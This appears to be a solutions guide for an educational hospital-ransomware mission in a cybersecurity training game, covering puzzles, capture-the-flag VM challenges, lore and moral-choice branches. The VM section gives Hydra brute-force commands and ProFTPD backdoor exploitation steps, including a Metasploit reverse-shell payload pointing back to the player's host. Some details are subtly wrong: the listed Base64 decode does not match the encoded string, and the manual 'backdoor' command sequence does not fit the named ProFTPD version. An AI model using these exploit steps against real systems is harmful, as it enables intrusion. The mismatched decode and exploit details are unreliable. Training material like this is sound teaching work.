- **Wrong answer - intentionally misleading**
  - 2018 is Emma's birthday year
  - Looks like a clue but is incorrect
  - Tests player observation skills

**Solution:** **1987**

**Alternative Method:**
- Object: "PIN Cracker Device" (found in Emergency Equipment Storage)
- Function: Automated brute force
- Time: ~2 minutes game time
- Use if clues missed or PIN forgotten

**Educational Value:**
- Teaches: Information gathering, cross-referencing clues, avoiding red herrings
- CyBOK: Security Operations (investigation techniques)

---

### Base64 Decoding Challenge

**Puzzle Type:** Encoding/decoding challenge
**Location:** Infected Terminal (IT Department)
**Tool:** CyberChef Workstation (Server Room)

**Encoded Message:**
```
WU9VUiBQQVRJRU5UIFJFQ09SRFMgQVJFIEVOQ1JZUFRFRC4gNDcgUEFUSUVOVFMgT04gTElGRSBTVVBQT1JULiAxMiBIT1VSUyBPRiBCQUNLVVAgUE9XRVIuIFBBWSAyLjUgQlRDIFRPIFtXQUxMRVRdIE9SIFdBVENIIFRIRU0gRElFLiAtIFJBTlNPTVdBUkUgSU5DT1JQT1JBVEVE
```

**Solution Steps:**
1. Read ransomware note on infected terminal (IT Department)
2. Copy Base64 string
3. Navigate to server room
4. Use CyberChef Workstation
5. Select "From Base64" operation
6. Paste encoded string
7. Click "Bake" or "Decode"

**Decoded Output:**
```
YOUR PATIENT RECORDS ARE ENCRYPTED. 47 PATIENTS ON LIFE SUPPORT. 12 HOURS OF BACKUP POWER. PAY £150,000 IN BITCOIN TO [WALLET] OR WATCH THEM DIE. - RANSOMWARE INCORPORATED
```

**Educational Value:**
- Teaches: Base64 encoding/decoding (reinforces Mission 1 concept)
- CyBOK: Applied Cryptography (encoding vs. encryption distinction)
- Tool: CyberChef (industry-standard tool)

**Optional Tutorial:**
- Agent 0x99 can explain Base64:
  - "Base64 is encoding, not encryption. No secret key needed."
  - "It's used to transport binary data as text."
  - "Easy to decode - not meant for security, just compatibility."

---

### ROT13 Decoding Challenge (Optional)

**Puzzle Type:** Caesar cipher (ROT13)
**Location:** Recovery instructions note (Emergency Equipment Storage)
**Tool:** CyberChef Workstation

**Encoded Message:**
```
SHYY ERPBIREL ERDHERRF BSSYVAR + BAYVAR XRLF—12-UBHE CEBPRFF VS ZNAHNY, VAFGNAG VS ENAFBZ CNVQ.
```

**Solution Steps:**
1. Find ROT13 note in emergency storage
2. Navigate to CyberChef workstation (server room)
3. Select "ROT13" operation
4. Paste encoded string
5. Decode

**Decoded Output:**
```
FULL RECOVERY REQUIRES OFFLINE + ONLINE KEYS—12-HOUR PROCESS IF MANUAL, INSTANT IF RANSOM PAID.
```

**Educational Value:**
- Teaches: Caesar cipher, ROT13 (new concept from Base64)
- CyBOK: Applied Cryptography (classical ciphers)
- Pattern Recognition: ALL CAPS + alphabetic = likely ROT13

---

## VM Challenge Solutions

### Challenge 1: SSH Access
**Flag:** `flag{ssh_access_granted}`
**Difficulty:** Easy
**CyBOK:** Systems Security, Network Security

**Scenario Details:**
- **Target:** 192.168.100.50
- **Service:** SSH (port 22)
- **Credentials:** Username + password authentication

**Solution Method 1: Password Hints (Recommended)**
1. Gather password hints from Gary (in-game)
2. Attempt SSH with common usernames:
   ```bash
   ssh gary@192.168.100.50
   # Try password: Emma2018 ✓ (likely correct)

   ssh root@192.168.100.50
   # Try password: Hospital1987

   ssh backup@192.168.100.50
   # Try password: StCatherines
   ```
3. Successful login reveals flag
4. Submit flag at drop-site terminal in-game

**Solution Method 2: Hydra Brute Force**
1. Create password wordlist from Gary's hints:
   ```bash
   echo "Emma2018" > passwords.txt
   echo "Hospital1987" >> passwords.txt
   echo "StCatherines" >> passwords.txt
   echo "gary2018" >> passwords.txt
   echo "backup1987" >> passwords.txt
   ```
2. Run Hydra:
   ```bash
   hydra -L users.txt -P passwords.txt ssh://192.168.100.50
   ```
3. Hydra finds valid credentials
4. SSH with discovered credentials

**Educational Objectives:**
- Password security (predictable patterns)
- SSH authentication
- Brute force techniques
- Wordlist creation

---

### Challenge 2: ProFTPD Exploitation
**Flag:** `flag{proftpd_backdoor_exploited}`
**Difficulty:** Medium
**CyBOK:** Malware & Attack Technologies, Systems Security

**Scenario Details:**
- **Target:** 192.168.100.50
- **Service:** ProFTPD 1.3.3c (port 21)
- **Vulnerability:** the ProFTPD 1.3.3c backdoor (backdoor command)

**Solution Method 1: Manual Exploitation**
1. Connect to FTP service:
   ```bash
   nc 192.168.100.50 21
   ```
2. Receive banner: `220 ProFTPD 1.3.3c Server`
3. Send backdoor command sequence:
   ```
   USER backdoor
   PASS backdoor
   SITE CPFR /etc/passwd
   SITE CPTO /tmp/passwd
   ```
4. Backdoor triggers, shell access gained
5. Flag revealed in response or /var/flags/
6. Submit flag at drop-site

**Solution Method 2: Metasploit**
1. Launch Metasploit:
   ```bash
   msfconsole
   ```
2. Use ProFTPD backdoor exploit:
   ```
   use exploit/unix/ftp/proftpd_133c_backdoor
   set RHOSTS 192.168.100.50
   set RPORT 21
   set PAYLOAD cmd/unix/reverse
   set LHOST [your IP]
   set LPORT 4444
   exploit
   ```
3. Shell access obtained
4. Navigate to /var/flags/
5. Cat flag file

**Solution Method 3: Searchsploit Research**
1. Research vulnerability:
   ```bash
   searchsploit proftpd 1.3.3c
   ```
2. Find the ProFTPD 1.3.3c backdoor exploit script
3. Download and execute exploit
4. Retrieve flag

**Educational Objectives:**
- CVE research
- Service exploitation
- Backdoor vulnerabilities
- Metasploit framework usage

---

### Challenge 3: Database Backup Location
**Flag:** `flag{database_backup_located}`
**Difficulty:** Easy
**CyBOK:** Systems Security, Security Operations

**Scenario Details:**
- **Prerequisite:** SSH or ProFTPD shell access
- **Objective:** Navigate Linux filesystem, locate encrypted database files

**Solution:**
1. Ensure shell access from Challenge 1 or 2
2. Navigate to backup directory:
   ```bash
   cd /var/backups
   ls -la
   ```
3. Observe files:
   ```
   patient_records.db.enc
   medical_systems.db.enc
   encryption_keys.txt
   operational_log.txt
   ```
4. Read encryption_keys.txt:
   ```bash
   cat encryption_keys.txt
   ```
5. File content reveals flag location or contains flag directly:
   ```
   Database backups located: /var/backups/*.db.enc
   Offline encryption keys required for decryption.
   Location: Emergency Equipment Storage, Administrative Wing, PIN-protected safe.

   flag{database_backup_located}
   ```
6. Copy flag
7. Submit at drop-site terminal in-game

**Educational Objectives:**
- Linux navigation (cd, ls, cat)
- File permissions understanding
- Backup storage conventions
- Intelligence gathering

---

### Challenge 4: Ghost's Operational Log
**Flag:** `flag{ghost_operational_log}`
**Difficulty:** Easy
**CyBOK:** Security Operations, Adversarial Behaviours

**Scenario Details:**
- **Prerequisite:** Access to /var/backups directory
- **Objective:** Read Ghost's operational philosophy document

**Solution:**
1. From /var/backups directory:
   ```bash
   cat operational_log.txt
   ```
2. Document content (excerpt):
   ```
   RANSOMWARE INCORPORATED - OPERATIONAL LOG
   OPERATION: ST. CATHERINE'S REGIONAL MEDICAL
   OPERATOR: Ghost

   PHASE 1: RECONNAISSANCE
   - 214 hospitals scanned
   - 147 have critical vulnerabilities
   - St. Catherine's selected: ProFTPD 1.3.3c backdoor

   PHASE 2: RISK ASSESSMENT
   - 47 patients on life support
   - Backup power: 12 hours
   - Patient mortality rate: 0.3% per hour
   - Projected deaths (manual recovery): 4-6
   - Projected deaths (ransom paid): 1-2

   PHASE 3: EXECUTION
   - Exploit deployed: 2024-XX-XX 03:47 UTC
   - Encryption complete: 2024-XX-XX 04:12 UTC
   - Ransom note delivered: 2024-XX-XX 04:15 UTC
   - Demand: £150,000, payable in Bitcoin

   RATIONALE:
   Healthcare sector is systemically vulnerable. We charge thousands for lessons
   nobody forgets. After this, St. Catherine's will triple cybersecurity budgets.
   40 other hospitals will too. Long-term? We'll prevent 200-600 deaths across 5 years.

   flag{ghost_operational_log}
   ```
3. Copy flag from document
4. Submit at drop-site terminal
5. **Reward:** Unlocks "Ghost's Manifesto" LORE fragment in-game

**Educational Objectives:**
- Adversarial mindset analysis
- Threat actor motivations
- Ransomware operations
- Ethical complexity (utilitarian calculus)

**Narrative Connection:**
- Reveals Ghost's calculated ideology
- Shows patient death probabilities
- Explains reconnaissance process
- Sets up moral dilemma in ransom decision

---

## LORE Fragment Locations

### LORE 1: Ghost's Manifesto
**Difficulty:** Beginner
**Location:** VM filesystem - /var/backups/operational_log.txt
**Unlock Requirement:** Submit flag 4 (`flag{ghost_operational_log}`)

**Content Summary:**
- **Title:** "Ransomware Incorporated - Operational Philosophy"
- **Author:** Ghost
- **Length:** ~500 words

**Key Excerpts:**
> "We don't cause system failures—we reveal them. St. Catherine's chose a £3.2M MRI over an £85K security upgrade. We made the consequences immediate."

> "Patient mortality calculations: 0.3% per hour. 47 patients. We're not reckless—we're mathematicians."

> "After this operation, 40 hospitals will upgrade security. Long-term deaths prevented: 200-600 across 5 years. Statistical modeling confirms it."

**Lore Significance:**
- Establishes Ransomware Incorporated philosophy
- True believer ideology (utilitarian calculus)
- "Cybersecurity through crisis" approach
- Connection to ENTROPY's larger goals

**Campaign Relevance:**
- Introduces Ghost as recurring antagonist
- Shows ENTROPY cell coordination
- Sets up moral complexity for Season 1

---

### LORE 2: CryptoSecure Recovery Services
**Difficulty:** Intermediate
**Location:** IT filing cabinet (it_department)
**Unlock Requirement:** Lockpick filing cabinet (easy difficulty)

**Content Summary:**
- **Title:** "CryptoSecure Recovery Services - Client Testimonial Log"
- **Cover:** Ransomware Incorporated's legitimate front company
- **Length:** ~400 words

**Key Excerpts:**
> "CRYPTOSECURE RECOVERY SERVICES
> Cryptocurrency-Based Data Recovery Specialists
> 24/7 Ransomware Negotiation & Recovery Support"

> "CLIENT TESTIMONIAL - Memorial Hospital System:
> 'When ransomware encrypted our records, CryptoSecure recovered everything in 3 hours. Professional, discreet, effective. Highly recommended.'
> —Dr. Patricia Chen, CTO"

> "Q1-Q2 2024 OPERATIONS LOG:
> - Memorial Hospital: £125K recovery
> - Regional Medical Center: £150K recovery
> - Community Health Network: £215K recovery
> Total Revenue: £490K (Q1-Q2)"

> "[METADATA - FOR ENTROPY CELL ONLY]:
> All 'recovery' operations are Ransomware Inc. attacks.
> CryptoSecure is front for ransom payment processing.
> 85% client satisfaction rating (recovered data delivered post-payment)."

**Lore Significance:**
- Reveals double-game: CryptoSecure is both attacker AND "recovery service"
- Shows previous hospital attacks (Memorial, Regional, Community)
- Explains how Ransomware Inc. maintains legitimate facade
- Demonstrates systematic targeting of healthcare sector

**Campaign Relevance:**
- Evidence of organized criminal operation
- Pattern recognition (multiple hospitals)
- Connection to broader ENTROPY network

---

### LORE 3: Zero Day Syndicate Invoice
**Difficulty:** Intermediate
**Location:** Dr. Kim's safe (dr_kim_office)
**Unlock Requirement:** Crack PIN safe (code: 1987)

**Content Summary:**
- **Title:** "Zero Day Syndicate - Invoice #ZDS-2024-0847"
- **Client:** Ransomware Incorporated (Ghost)
- **Purpose:** Sets up Mission 3, reveals ENTROPY coordination
- **Length:** ~300 words

**Full Invoice:**
```
ZERO DAY SYNDICATE
Vulnerability Research & Exploit Brokerage
INVOICE #ZDS-2024-0847

CLIENT: Ransomware Incorporated (Ghost)
PROJECT: Healthcare Sector Exploit Package
TARGET: St. Catherine's Regional Medical Center

DELIVERABLES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. ProFTPD 1.3.3c Exploit     $25,000
   - Backdoor command injection
   - Shell access guaranteed
   - Bypass authentication

2. Reconnaissance Package                     $15,000
   - 214 hospitals scanned
   - Vulnerability assessment
   - Target prioritization (147 vulnerable)

3. Target Selection Consultation              $10,000
   - St. Catherine's profile
   - Patient life support analysis
   - Backup power timeline (12 hours)

4. Deployment Technical Guide                  $5,000
   - Step-by-step exploitation
   - Encryption key management
   - Ransom note template
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUBTOTAL:                                     $55,000
ENTROPY COORDINATION DISCOUNT (15%):          -$8,250
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TOTAL DUE:                                    $46,750

PAYMENT: Received via Crypto Anarchist Cell (Bitcoin mixing)
DATE: 2024-05-15
STATUS: ✓ PAID IN FULL

ARCHITECT APPROVAL: ✓ CONFIRMED
PRIORITY: HIGH (Healthcare sector targeting coordinated across cells)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Zero Day Syndicate
"Information Asymmetry is Market Value"
[Contact details redacted]
```

**Lore Significance:**
- **MAJOR REVEAL:** Zero Day Syndicate sold exploit to Ransomware Inc.
- **ENTROPY Coordination:** "Architect Approval" shows central coordination
- **Cross-Cell Connection:** Payment via Crypto Anarchist cell (Mission 6 setup)
- **Healthcare Targeting:** Coordinated strategy across ENTROPY network
- **Pricing Model:** Shows exploit marketplace economics

**Campaign Relevance:**
- **Sets up Mission 3:** "Ghost in the Machine" (infiltrate Zero Day Syndicate)
- **First direct evidence** of ENTROPY cells working together
- **"The Architect" mentioned:** Campaign arc antagonist introduced
- **Crypto Anarchists reference:** Links to Mission 6

**Player Realization Moment:**
> "Wait... Zero Day Syndicate SOLD the exploit to Ghost? ENTROPY cells are COORDINATING?!"

This is the **"Aha!" moment** that transforms Season 1 from isolated missions into a connected campaign.

---

## Moral Choices & Consequences

### Choice 1: Ransom Payment Decision
**Trigger:** After recovering both offline and online decryption keys
**Location:** Ransom Interface Terminal (server_room)
**Locked Until:** Objectives 3 AND 4 both complete

---

#### Option A: Pay Ransom (£150,000, payable in Bitcoin)

**Immediate Consequences:**
- **Recovery Time:** 2-4 hours (fast)
- **Patient Deaths:** 1-2 deaths
  - Cardiac arrest during system transition
  - Ventilator briefly offline during reboot
- **Hospital Budget:** £150,000 expense
  - Security upgrade postponed to next fiscal year
  - Budget strain on other departments

**ENTROPY Impact:**
- **Ransomware Incorporated Funding:** +£150,000
  - Enables 2-3 more hospital attacks
  - Ghost targets 12 additional facilities in next 6 months
- **Precedent Set:** Other hospitals more likely to pay
  - Ransomware Inc. success rate increases
  - More attackers enter healthcare sector

**Hospital Impact:**
- **Dr. Kim's Career:** Job secure, but guilt over payment
  - Board supports decision (lives saved)
  - Internal investigation clears her
- **Gary Whitlock:** Vindicated if protected, otherwise scapegoated
  - Depends on player choice to document warnings
- **Security Posture:** Minimal improvement
  - £85K security upgrade postponed
  - Same vulnerabilities remain

**Dr. Kim's Response:**
> "We paid them. 47 lives saved, 2 lost. I'll carry that guilt, but it was the right call."

**Ghost's Response:**
> "Smart choice. Decryption keys delivered. Systems restoring. Your £150,000 will fund operations that save 200-600 lives long-term. Statistical modeling confirms it."

**Agent 0x99's Assessment:**
> "You chose the immediate lives. Hard to argue with that math. But ENTROPY just got funded for their next operation."

**Global Variable:** `paid_ransom` = true

---

#### Option B: Manual Recovery (Deny Ransom)

**Immediate Consequences:**
- **Recovery Time:** 12 hours (slow)
- **Patient Deaths:** 4-6 deaths
  - Ventilator complications (3-4 deaths)
  - Dialysis failures (1-2 deaths)
  - Cardiac monitoring gaps
- **Hospital Budget:** £0 expense to ENTROPY
  - £150,000 available for security upgrade
  - Budget allocated to infrastructure improvements

**ENTROPY Impact:**
- **Ransomware Incorporated Funding:** £0
  - Operation disrupted (no payment received)
  - Ghost's cell loses operational funding
  - Future attacks delayed/scaled back
- **Precedent Set:** Hospitals less likely to pay
  - Ransomware model becomes less profitable
  - Healthcare sector hardening

**Hospital Impact:**
- **Dr. Kim's Career:** Likely resignation
  - Board blames her for deaths
  - Public scandal, media pressure
  - Replaced by cybersecurity-focused CTO
- **Gary Whitlock:** Vindicated if protected
  - Promoted to security leadership if player protected him
  - Otherwise scapegoated and fired
- **Security Posture:** Major improvement
  - £85K security upgrade funded immediately
  - Comprehensive infrastructure overhaul
  - St. Catherine's becomes regional security model

**Dr. Kim's Response:**
> "We didn't pay. 4-6 deaths... but we denied them funding. I'll resign. This is my fault for ignoring Gary's warnings."

**Ghost's Response:**
> "Disappointing. 4-6 deaths on your conscience. But I respect the principle. Healthcare sector needed this lesson. Next hospital won't make St. Catherine's mistakes."

**Agent 0x99's Assessment:**
> "You denied ENTROPY funding. Long-term, that saves lives. But today... 4-6 families lost someone. That's on all of us."

**Global Variable:** `paid_ransom` = false

---

#### Decision Matrix

| Metric | Pay Ransom | Deny Ransom |
|--------|-----------|-------------|
| **Patient Deaths (Immediate)** | 1-2 | 4-6 |
| **Recovery Time** | 2-4 hours | 12 hours |
| **Cost to Hospital** | £150,000 | £0 |
| **ENTROPY Funding** | +£150,000 | £0 |
| **Future Attacks (6 months)** | 12+ hospitals | 2-3 hospitals |
| **Long-Term Deaths Prevented** | 0 | 200-600 (estimated) |
| **Dr. Kim's Career** | Survives | Resignation |
| **Security Upgrade** | Postponed | Funded |
| **Sector-Wide Impact** | Encourages payment | Discourages ransomware |

**Educational Question:** "Is utilitarian calculus valid in crisis ethics?"

---

### Choice 2: Hospital Exposure Decision
**Trigger:** Closing debrief with Agent 0x99
**Location:** Phone call (auto-triggered after ransom decision)
**Context:** Dr. Kim ignored Gary's warnings, budget cuts enabled attack

---

#### Option A: Expose Hospital Negligence Publicly

**Immediate Consequences:**
- **Media Coverage:** National scandal
  - "Hospital Ignored Security Warnings, Patients Died"
  - Board of Directors investigated
  - Federal healthcare cybersecurity audit triggered
- **Dr. Kim's Fate:** Fired, reputation damaged
  - Medical board investigation
  - Career effectively over
  - Personal guilt + public shame
- **Gary Whitlock's Fate:** Vindicated publicly
  - Whistleblower status
  - Job offers from other hospitals
  - Becomes cybersecurity advocate

**Healthcare Sector Impact:**
- **Positive - Sector-Wide Security Improvements:**
  - 200+ hospitals increase cybersecurity budgets
  - Federal regulations tightened
  - Healthcare cybersecurity standards raised
  - Estimated 200-600 deaths prevented (next 5 years)
- **Negative - Public Trust Damaged:**
  - Patient confidence in healthcare IT systems eroded
  - Hospitals face increased insurance costs
  - Some patients delay critical care (fear of cyber attacks)

**SAFETYNET Impact:**
- **Reputation:** "Ruthless but effective"
  - Hospitals fear SAFETYNET operations (expose negligence)
  - Cooperation more difficult in future missions
  - Public perception: "They care about accountability, not people"

**Agent 0x99's Response:**
> "You went public. Dr. Kim's career is over, but 200+ hospitals just upgraded security. Long-term, that's the right call. But it's brutal."

**Global Variable:** `exposed_hospital` = true

---

#### Option B: Quiet Resolution (Internal Improvements Only)

**Immediate Consequences:**
- **No Media Coverage:** Incident handled internally
  - Board receives confidential report
  - No federal investigation
  - Public unaware of negligence
- **Dr. Kim's Fate:** Keeps job, internal reforms
  - Forced to implement security overhaul
  - Credibility damaged internally
  - Mandatory cybersecurity training
- **Gary Whitlock's Fate:** Promoted internally
  - Director of Cybersecurity (if protected by player)
  - $180K salary, full team
  - Otherwise: Quiet resignation

**Healthcare Sector Impact:**
- **Positive - St. Catherine's Improvement:**
  - £85K security upgrade funded
  - Internal cybersecurity reforms
  - Staff training programs
  - St. Catherine's becomes secure
- **Negative - No Sector-Wide Change:**
  - Other hospitals remain vulnerable
  - Same budget pressures exist
  - No federal regulations
  - Estimated 0 deaths prevented outside St. Catherine's

**SAFETYNET Impact:**
- **Reputation:** "Discreet and professional"
  - Hospitals trust SAFETYNET operations
  - Better cooperation in future missions
  - Public perception: "They protect institutions and people"

**Agent 0x99's Response:**
> "Quiet resolution. Dr. Kim keeps her job, St. Catherine's fixes their systems. But other hospitals? Still vulnerable. Sometimes I wonder if we should burn it all down for the lesson."

**Global Variable:** `exposed_hospital` = false

---

#### Decision Matrix

| Metric | Expose Publicly | Quiet Resolution |
|--------|----------------|------------------|
| **Dr. Kim's Career** | Destroyed | Survives (damaged) |
| **Gary's Outcome** | National vindication | Internal promotion |
| **St. Catherine's Security** | Improved | Improved |
| **Sector-Wide Security** | +200 hospitals improve | 0 hospitals improve |
| **Long-Term Deaths Prevented** | 200-600 (5 years) | 0 |
| **Public Trust in Healthcare** | Damaged | Maintained |
| **SAFETYNET Reputation** | "Ruthless" | "Discreet" |
| **Federal Investigation** | Yes | No |
| **Media Scandal** | National | None |

**Educational Question:** "Does institutional accountability require public shaming?"

---

### Choice 3: Gary Protection (Mid-Mission)
**Trigger:** Finding scapegoating email in IT filing cabinet
**Location:** IT Department
**Optional:** Yes (can skip this choice)

**Email Content:**
> "From: Hospital Board
> To: Legal Department
> Re: Ransomware Incident - Liability Management
>
> IT Administrator Gary Whitlock is to be terminated effective immediately following crisis resolution. Public statement will attribute attack to 'IT department security failures.' This protects the board from negligence claims regarding budget decisions."

**Player Options:**

**Option A: Protect Gary (Document His Warnings)**
- Return to Gary, tell him about email
- Dialogue: "I'll document your warnings. You won't be scapegoated."
- **Outcome:**
  - Gary provides additional cooperation (keycard, passwords)
  - Documentation protects Gary in investigation
  - Debrief: Gary vindicated, promoted to Director of Cybersecurity
  - Salary: $180K, full security team
  - Global variable: `gary_protected` = true

**Option B: Warn Gary to Resign**
- Tell Gary about email, advise resignation
- **Outcome:**
  - Gary resigns before firing
  - Loses access to server room keycard
  - Debrief: Gary leaves healthcare, becomes consultant
  - Global variable: `gary_protected` = false

**Option C: Ignore (Don't Tell Gary)**
- Don't mention email to Gary
- **Outcome:**
  - Gary scapegoated after mission
  - Fired, reputation damaged
  - Debrief: Gary unemployed, bitter
  - Global variable: `gary_protected` = false

**Consequences in Debrief:**

**If Protected:**
> Agent 0x99: "Gary was vindicated. Your documentation of his warnings went public. He's now Director of Cybersecurity at Metro General Hospital. $180K salary, full team. You gave him his career back."

**If Not Protected:**
> Agent 0x99: "Gary was fired. Board blamed him for security failures. He's unemployed, reputation ruined. We could have protected him."

---

### Combined Choices - Debrief Variations

**The closing debrief acknowledges ALL player choices:**

**Example: Paid Ransom + Exposed Hospital + Protected Gary**
> Agent 0x99: "Let's review. You paid the ransom—1-2 deaths, systems restored fast. ENTROPY got funded, but you saved lives today. You exposed the hospital publicly—Dr. Kim's career is over, but 200 hospitals just upgraded security. And you protected Gary—he's now running cybersecurity at Metro General. Messy, but effective."

**Example: Denied Ransom + Quiet Resolution + Ignored Gary**
> Agent 0x99: "Let's review. You denied the ransom—4-6 deaths, but ENTROPY got £0. That's courage. You kept it quiet—no sector-wide change, but Dr. Kim keeps her job. And Gary? He was scapegoated. Fired, reputation destroyed. We could have protected him. Mixed bag, agent."

**Example: Paid Ransom + Quiet Resolution + Protected Gary**
> Agent 0x99: "You paid the ransom, kept it quiet, protected Gary. Lives saved, institution protected, whistleblower vindicated. Clean operation, professional execution. But ENTROPY got funded and other hospitals stay vulnerable. Sometimes I wonder if 'clean' is what we need."

---

## Complete Item List

### Starting Inventory

**Phone**
- Type: Phone
- Name: "Your Phone"
- Function: Contact Agent 0x99, Ghost (mid-mission)
- Observations: "Your secure phone with encrypted connection to SAFETYNET"

**Lockpick Kit**
- Type: Lockpick
- Name: "Lock Pick Kit"
- Function: Bypass physical locks (doors, containers)
- Difficulty Scaling: Easy → Medium → Medium-Hard
- Observations: "Professional lock picking kit for bypassing physical locks"

---

### Key Items (Critical Path)

**Server Room Keycard** (Optional - High Gary Trust)
- Type: Keycard
- Name: "Server Room Access Keycard"
- Source: Gary Whitlock (gary_influence >= 45)
- Function: Unlock server room door (bypass lockpicking)
- Observations: "RFID keycard for server room - Gary's personal access"

**Password Sticky Notes**
- Type: Notes
- Name: "Gary's Password Hints"
- Source: Gary's desk drawer (lockpick easy) OR Gary dialogue
- Content: "Emma2018, Hospital1987, StCatherines"
- Function: SSH password hints for VM challenge
- Observations: "Sticky notes with password patterns - Gary's weak security practice"

**Offline Backup Encryption Keys**
- Type: Notes (USB drive representation)
- Name: "Offline Backup Encryption Keys"
- Source: Emergency Storage Safe (PIN 1987)
- Function: Required for manual recovery path
- Observations: "USB drive with offline backup decryption keys - critical for recovery"

---

### Optional Items

**PIN Cracker Device**
- Type: Notes (tool representation)
- Name: "PIN Cracker Device"
- Source: Emergency Equipment Storage (lying on shelf)
- Function: Brute force 4-digit PIN safes (~2 min)
- Observations: "Automated 4-digit PIN brute force tool. Estimated time: 2 minutes. Use if clues to safe PIN cannot be found."

**Fire Extinguisher** (Combat Path Only)
- Type: Notes (improvised weapon)
- Name: "Fire Extinguisher"
- Source: Hallway North wall mount (during guard combat)
- Function: Improvised weapon for guard combat (influence >= 25 required)
- Observations: "Standard fire extinguisher. Heavy enough to use as a weapon if desperate."

---

### LORE Items (Optional)

**Ghost's Manifesto** (LORE Fragment 1)
- Type: Notes (LORE)
- Name: "Ransomware Incorporated - Operational Philosophy"
- Source: VM filesystem /var/backups/operational_log.txt
- Requirement: Submit flag 4 (`ghost_operational_log`)
- Content: Ghost's patient death calculations, utilitarian justification
- Observations: "Document revealing Ghost's calculated ideology and patient mortality statistics"

**CryptoSecure Services Log** (LORE Fragment 2)
- Type: Notes (LORE)
- Name: "CryptoSecure Recovery Services - Client Testimonials"
- Source: IT filing cabinet (lockpick easy)
- Content: Front company testimonials, previous hospital attacks
- Observations: "Evidence that CryptoSecure is Ransomware Inc.'s legitimate facade"

**Zero Day Syndicate Invoice** (LORE Fragment 3)
- Type: Notes (LORE)
- Name: "Zero Day Syndicate Invoice #ZDS-2024-0847"
- Source: Dr. Kim's safe (PIN 1987)
- Content: Invoice showing ZDS sold ProFTPD exploit to Ghost ($55K)
- Observations: "Critical evidence linking ENTROPY cells together. Sets up Mission 3."

---

### Environmental Clues

**Hospital Founding Plaque**
- Type: Readable object
- Name: "St. Catherine's Hospital Founding Plaque"
- Location: Reception Lobby
- Content: "Founded 1987" (PIN Clue #1)
- Observations: "Bronze plaque commemorating hospital founding - pay attention to the year"

**Dr. Kim's Sticky Note**
- Type: Readable object
- Name: "Sticky Note on Dr. Kim's Desk"
- Location: Dr. Kim's Office
- Content: "Safe combination: founding year"
- Observations: "Confirms the PIN safe uses the hospital's founding year"

**Emma's Photo Frame**
- Type: Readable object
- Name: "Photo Frame - Emma's Birthday"
- Location: Gary's desk (IT Department)
- Content: "Emma - 7th birthday! 05/17/2018"
- Observations: "Red herring - 2018 is NOT the safe combination"

**Gary Warning Email**
- Type: Readable object (from filing cabinet)
- Name: "Gary's Security Warning Email Archive"
- Location: IT filing cabinet (lockpick easy)
- Content: Email chain showing Gary warning Dr. Kim about ProFTPD vulnerability
- Observations: "Evidence that Gary tried to prevent the attack - use to protect him"

**Scapegoating Email**
- Type: Readable object (from filing cabinet)
- Name: "Board Email - Liability Management"
- Location: IT filing cabinet (lockpick easy)
- Content: Board's plan to fire Gary and blame him
- Observations: "Evidence of planned scapegoating - tell Gary to protect him"

**Budget Cut Evidence**
- Type: Readable object
- Name: "Hospital Budget Committee Minutes"
- Location: Conference Room (budget evidence container)
- Content: Board chose £3.2M MRI over £85K security upgrade
- Observations: "Shows hospital negligence - key to exposure decision"

---

### VM-Related Items (Flags)

**Flag 1: SSH Access**
- Type: Flag submission
- Name: `flag{ssh_access_granted}`
- Source: VM terminal after SSH login success
- Function: Submit at drop-site terminal for progress
- Reward: ENTROPY server credentials intercepted

**Flag 2: ProFTPD Backdoor**
- Type: Flag submission
- Name: `flag{proftpd_backdoor_exploited}`
- Source: VM terminal after the ProFTPD 1.3.3c backdoor exploit
- Function: Submit at drop-site terminal for progress
- Reward: Shell access to backup server established

**Flag 3: Database Backup Location**
- Type: Flag submission
- Name: `flag{database_backup_located}`
- Source: VM filesystem /var/backups/encryption_keys.txt
- Function: Submit at drop-site terminal for progress
- Reward: Intel reveals safe location (Emergency Equipment Storage)

**Flag 4: Ghost's Operational Log**
- Type: Flag submission
- Name: `flag{ghost_operational_log}`
- Source: VM filesystem /var/backups/operational_log.txt
- Function: Submit at drop-site terminal for progress
- Reward: Unlocks "Ghost's Manifesto" LORE fragment

---

## Speedrun Optimization Guide

### Minimal Completion Route (60% Mission Score)
**Time: 35-40 minutes**

1. Spawn → Read founding plaque (1987) → Meet Dr. Kim (5 min)
2. Meet Gary → Lockpick desk → Get password hints (5 min)
3. Navigate to server room → Wait for guard patrol gap → Lockpick door (5 min)
4. VM Terminal → SSH with Emma2018 → Submit flag 1 (3 min)
5. Exploit ProFTPD → Submit flag 2 (3 min)
6. Find database backups → Submit flag 3 (2 min)
7. Navigate to Emergency Storage → Enter PIN 1987 → Get offline keys (5 min)
8. Return to server room → Pay ransom (fast recovery) (2 min)
9. Debrief → Quiet resolution → Complete (5 min)

**Requirements:**
- 2 VM flags (SSH + ProFTPD)
- Offline backup keys recovered
- Ransom decision made
- Exposure decision made

**Skip:**
- Flag 4 (Ghost's log)
- All LORE fragments
- Gary protection
- Base64/ROT13 challenges

---

### 100% Perfect Score Route
**Time: 65-75 minutes**

**Phase 1: Investigation & Trust Building (15 min)**
1. Spawn → Read founding plaque, directory, sign-in log
2. Meet Dr. Kim → Choose empathetic options → Build kim_influence
3. Meet Gary → ALL empathetic options → gary_influence >= 45
4. Gary gives server_room_keycard + password hints
5. Lockpick IT filing cabinet → LORE 2 + Gary warning email + scapegoating email
6. Return to Gary → "I'll protect you" → gary_protected = true

**Phase 2: Server Room & VM Challenges (25 min)**
7. Navigate to hallway_north → Use keycard (no guard confrontation)
8. Enter server_room
9. VM Terminal → Complete all 4 flags:
   - SSH with Emma2018 → flag 1
   - ProFTPD exploit → flag 2
   - Database backups → flag 3
   - Ghost's log → flag 4 + LORE 1
10. CyberChef workstation → Decode Base64 (educational)

**Phase 3: Offline Keys & Optional LORE (15 min)**
11. Navigate to dr_kim_office → Enter PIN 1987 on safe → LORE 3 (ZDS invoice)
12. Navigate to emergency_equipment_storage
13. Enter PIN 1987 → Offline backup keys
14. Read ROT13 note → Decode at CyberChef (educational)

**Phase 4: Critical Decisions (10 min)**
15. Return to server_room → Ransom Interface Terminal
16. Make ransom decision (pay vs deny) - based on player ethics
17. Debrief with Agent 0x99:
    - Make exposure decision (public vs quiet)
    - Confirm Gary protected

**Perfect Score Requirements:**
- All 4 VM flags submitted
- All 3 LORE fragments collected
- Both moral choices made (any outcome)
- Gary protected (gary_protected = true)
